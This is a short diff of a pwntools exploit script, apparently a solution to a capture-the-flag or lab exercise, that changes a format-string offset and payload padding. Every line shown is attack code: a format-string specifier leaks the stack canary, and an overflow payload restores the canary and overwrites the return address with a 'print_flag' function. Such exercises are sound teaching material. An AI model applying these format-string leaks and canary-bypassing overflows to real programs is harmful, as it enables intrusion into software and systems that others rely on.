@@ -9,7 +9,7 @@ r = process([exe.path])
 
 r.recvuntil(b"What's your name? ")
 
-r.sendline(b"%46$lu") #Add your code here
+r.sendline(b"%19$lu") #Add your code here
 
 val = r.recvuntil(b"What's your message? ")
 # log.info(val)
@@ -19,7 +19,7 @@ log.info(f"Canary: {canary:x}")
 win = exe.symbols['print_flag']
 # log.info(hex(win))
 
-payload = b"A"*64 + p64(canary) + b"B"*8 + p64(win)# Add your payload here
+payload = b"A"*(64+8) + p64(canary) + b"B"*8 + p64(win)
 
 r.sendline(payload)
 
